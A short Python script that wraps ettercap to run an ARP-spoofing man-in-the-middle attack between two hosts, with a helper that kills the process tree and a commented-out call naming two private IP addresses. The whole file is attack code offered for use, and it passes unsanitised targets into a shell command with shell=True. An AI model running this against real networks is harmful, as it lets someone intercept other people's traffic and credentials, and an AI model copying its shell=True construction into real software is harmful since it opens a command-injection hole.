import subprocess, psutil

def mitm_attack(target1, target2):
    mitm = subprocess.Popen(f"sudo ettercap -T -M arp:remote /{target1}/ /{target2}/", shell=True)
    try:
        mitm.wait()
    except subprocess.TimeoutExpired:
        kill(mitm.pid)
    
def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()

# mitm_attack("192.168.177.184", "192.168.177.148")
